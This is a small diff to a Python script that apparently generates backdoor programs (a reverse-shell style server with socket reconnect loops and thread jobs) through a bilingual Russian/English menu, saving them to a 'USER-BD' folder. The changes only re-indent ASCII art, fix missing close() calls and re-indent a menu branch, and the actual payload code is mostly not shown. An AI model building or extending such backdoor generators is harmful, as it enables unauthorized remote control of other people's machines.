@@ -149,12 +149,12 @@ def DefSec4():
 		      /N   .mo  sh`       -m+   od`  /N       
 		      /N    `dsom`         .m+ +m.   /N       
 		      :MyyyyyhMMdyyyyyyyyyyydMhMdyyyydm       
-			    :Nhh`           :My              
-			   -N:sd`          -N/hy             
-			  .m+   om`       .m+  hy`           
-			 `do     +m.     `do    yh`          
-			 hy       /m.    dy      sh`         
-			yh         /N:  hy        om`        
+				    :Nhh`           :My              
+				   -N:sd`          -N/hy             
+				  .m+   om`       .m+  hy`           
+				 `do     +m.     `do    yh`          
+				 hy       /m.    dy      sh`         
+				yh         /N:  hy        om`        
 		       om`          -N/yh`         om.       
 		      /m.            -md`           +m.      
 		      ''`                             ::           
@@ -545,9 +545,8 @@ def create_jobs():
 	queue.join()
 
 create_threads()
-create_jobs()
-			""")
-			b.close
+create_jobs() """)
+			b.close()
 			print('Готово!(Done!)')
 			print('Посмотрите в папке USER-BD')
 			print('Look in the USER-BD folder')
@@ -672,7 +671,7 @@ while True:
 		del objSocket
 		server_connect()
 			""")
-			a.close
+			a.close()
 			print('Готово!(Done!)')
 			print('Посмотрите в папке USER-BD')
 			print('Look in the USER-BD folder')
@@ -733,7 +732,7 @@ P.s Given which OS and commands you need to enter	'''
 	elif back ==3:
 		Backdoor3()
 	elif back == 4:
-                Backdoor4()
+        Backdoor4()
 	else:
 		print("Не найдено(Not found)")
 def DefSec99():
